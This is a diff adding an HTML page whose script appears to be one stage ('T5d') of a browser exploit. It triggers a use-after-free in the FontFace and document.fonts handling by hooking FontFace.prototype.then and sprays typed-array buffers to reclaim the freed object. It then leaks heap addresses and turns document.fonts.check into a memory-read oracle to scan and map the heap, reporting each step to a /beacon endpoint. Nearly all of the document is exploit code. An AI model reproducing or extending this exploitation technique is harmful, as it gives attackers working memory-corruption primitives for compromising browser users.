@@ -1,0 +1,227 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>T5d</title></head>
+<body><pre id="O">T5d</pre>
+<script>
+'use strict';
+function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T5d-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
+bs('BOOT');
+var K=512,SZ=192,fired=false,faces=null,AT=0;
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function hex(x){return '0x'+x.toString(16);}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
+
+function start(){
+  AT++;if(AT>1)return;
+  try{if(sessionStorage.getItem('uaf')){bs('DOUBLE');return;}sessionStorage.setItem('uaf','1');}catch(e){}
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SZ));
+      put32(w,0,0x80000000);
+      put32(w,4,0x1000+k);
+      w[0x82]=3;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,80);},function(){});
+}
+
+function phase(){
+  var bufs=[],L1=0n,L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58);
+    if(a>0x1000000000n){
+      var b2=le(window.__sp[i],0x68);
+      if(L1===0n){L1=a;L2=b2;}
+      bufs.push([window.__sp[i],b2,i]);
+    }
+  }
+  bs('L1='+hex(L1)+'-L2='+hex(L2)+'-bufs='+bufs.length);
+  if(!bufs.length){bs('NOLEAK');return;}
+
+  for(var ib=0;ib<bufs.length;ib++){
+    var vb=bufs[ib][0];
+    vb[0]=2;put64(vb,0x08,bufs[ib][1]);put64(vb,0x10,0n);vb[0x82]=0;
+  }
+  setTimeout(function(){
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+    for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=0;bufs[is2][0][0x2C]=0;}
+    setTimeout(function(){
+      var fam=null,zi=-1;
+      for(var q=0;q<faces.length;q++){
+        var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){r='EX';}
+        if(r===false&&zi<0){fam='zz'+q;zi=q;}
+      }
+      bs('FAM='+fam+'-zi='+zi);
+      if(!fam){bs('NOTIN');return;}
+      var h0=bufs[0][0];
+
+      // Write markers into ALL spray buffers:
+      //   +0x38/+0x3C: 0xBEEF/0xBF00 (64-bit BEEF marker)
+      //   +0x48/+0x4C: (2+ip)/(2+ip) (ID, oracle-readable: from=to=ID)
+      for(var ip=0;ip<window.__sp.length;ip++){
+        var vp2=window.__sp[ip];
+        vp2[0x82]=0;put64(vp2,0x20,L1);
+        put32(vp2,0x28,1);put32(vp2,0x2C,1);
+        put32(vp2,0x38,0xBEEF);put32(vp2,0x3C,0xBF00);
+        put32(vp2,0x48,2+ip);put32(vp2,0x4C,2+ip);
+      }
+      bufs=null;
+
+      function setR(addr){put64(h0,0x20,addr);}
+      function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c));}catch(e){return 'EX';}}
+
+      // ============================================================
+      // PHASE 1: Find SELF (quick scan at step 0x80, same as T4l)
+      // ============================================================
+      bs('SCAN1');
+      var self=0n;
+      var base=0x1000800000n,end=0x1002800000n;
+      for(var sc=base;sc<end&&!self;sc+=0x80n){
+        setR(sc+0x38n);
+        if(chk(0xBEEF)!==true)continue;
+        if(chk(0xBEEE)!==false)continue;
+        setR(sc+0x6Cn);
+        if(chk(0)===false){self=sc;bs('SELF='+hex(sc));}
+      }
+      if(!self){bs('NOSELF');return;}
+
+      function rst(){setR(self+0x38n);chk(0xBEEF);}
+
+      // Compute slot alignment from SELF
+      // SELF mod 0xC0 gives the offset within the slot grid
+      var selfMod=self%0xC0n;
+      bs('ALIGN='+hex(selfMod));
+
+      setTimeout(function(){
+        // ============================================================
+        // PHASE 2: ALIGNED SPRAY SCAN (step 0xC0, slot-aligned)
+        // ============================================================
+        // Scan at addresses ≡ SELF (mod 0xC0).
+        // Strict 64-bit check: from=0xBEEF AND to=0xBF00
+        bs('SCAN2');
+        var scanBase=base+selfMod;
+        var sprayHits=[];
+        var scanN=0;
+
+        for(var sa=scanBase;sa<end;sa+=0xC0n){
+          if(sa===self)continue;
+          setR(sa+0x38n);
+          scanN++;
+          // Check from=0xBEEF: chk(BEEF)=true, chk(BEEE)=false
+          if(chk(0xBEEF)!==true)continue;
+          scanN++;
+          if(chk(0xBEEE)!==false)continue;
+          // Check to=0xBF00: chk(BF00)=true, chk(BF01)=false
+          scanN++;
+          if(chk(0xBF00)!==true)continue;
+          scanN++;
+          if(chk(0xBF01)!==false)continue;
+          // Full 64-bit match confirmed
+          sprayHits.push(sa);
+          rst();
+        }
+        bs('SCAN2-DONE-n='+scanN+'-hits='+sprayHits.length);
+
+        if(!sprayHits.length){bs('NOSPRAY');return;}
+
+        // ============================================================
+        // PHASE 3: READ IDs from spray hits
+        // ============================================================
+        bs('PH3-ID');
+        var mapped=[];
+        var maxRead=Math.min(sprayHits.length,30);
+        for(var ri=0;ri<maxRead;ri++){
+          var addr=sprayHits[ri];
+          rst();setR(addr+0x48n);
+          var lo=2,hi=513;
+          for(var bi=0;bi<10;bi++){
+            var m=(lo+hi)>>>1;
+            if(chk(m)===true)hi=m;else lo=m+1;
+          }
+          var spIdx=lo-2;
+          mapped.push({addr:addr,idx:spIdx});
+          if(ri<10)bs('MAP='+hex(addr)+'-idx='+spIdx);
+        }
+        bs('PH3-MAPPED='+mapped.length);
+
+        // ============================================================
+        // PHASE 4: BIDIRECTIONAL VERIFY
+        // ============================================================
+        if(mapped.length>0&&mapped[0].idx>=0&&mapped[0].idx<K){
+          bs('PH4-BIDIR');
+          var t=mapped[0];
+          var buf=window.__sp[t.idx];
+          if(!buf){bs('PH4-NOBUF');return;}
+
+          put32(buf,0x48,0x1234);put32(buf,0x4C,0x1234);
+          rst();setR(t.addr+0x48n);
+          var w1=chk(0x1234),w2=chk(0x1233);
+          bs('BIDIR='+w1+'/'+w2);
+          put32(buf,0x48,2+t.idx);put32(buf,0x4C,2+t.idx);
+
+          if(mapped.length>1){
+            var t2=mapped[1];
+            var buf2=window.__sp[t2.idx];
+            if(buf2){
+              put32(buf2,0x48,0x5678);put32(buf2,0x4C,0x5678);
+              rst();setR(t2.addr+0x48n);
+              var w3=chk(0x5678),w4=chk(0x5677);
+              bs('BIDIR2='+w3+'/'+w4);
+              put32(buf2,0x48,2+t2.idx);put32(buf2,0x4C,2+t2.idx);
+            }
+          }
+        }
+
+        // ============================================================
+        // PHASE 5: DISTANCE MAP
+        // ============================================================
+        bs('PH5-DIST');
+        var dists=[];
+        for(var di=0;di<mapped.length;di++){
+          dists.push(Number(mapped[di].addr-self));
+        }
+        dists.sort(function(a,b){return a-b;});
+        if(dists.length>0){
+          bs('RANGE='+dists[0]+'..'+dists[dists.length-1]);
+          for(var ri2=0;ri2<Math.min(5,dists.length);ri2++)bs('D'+ri2+'='+dists[ri2]);
+          if(dists.length>5)bs('DLAST='+dists[dists.length-1]);
+        }
+
+        // ============================================================
+        // PHASE 6: NEIGHBOR SURVEY
+        // ============================================================
+        bs('PH6-NBR');
+        for(var nn=-5;nn<=5;nn++){
+          if(nn===0){bs('N0=SELF');continue;}
+          var na=self+BigInt(nn)*0xC0n;
+          rst();setR(na);
+          var n0=chk(0);
+          var nc='?';
+          if(n0===true){var n1=chk(1);nc=n1===false?'Z':'S';}
+          else{nc='L';}
+          bs('N'+nn+'='+nc);
+        }
+
+        var tb=0x800000000n;
+        bs('TB='+hex(tb));
+        bs('DONE-hits='+sprayHits.length+'-mapped='+mapped.length);
+        document.getElementById('O').textContent='T5d DONE hits='+sprayHits.length+' mapped='+mapped.length;
+      },200);
+    },500);
+  });
+}
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',start);
+</script></body></html>
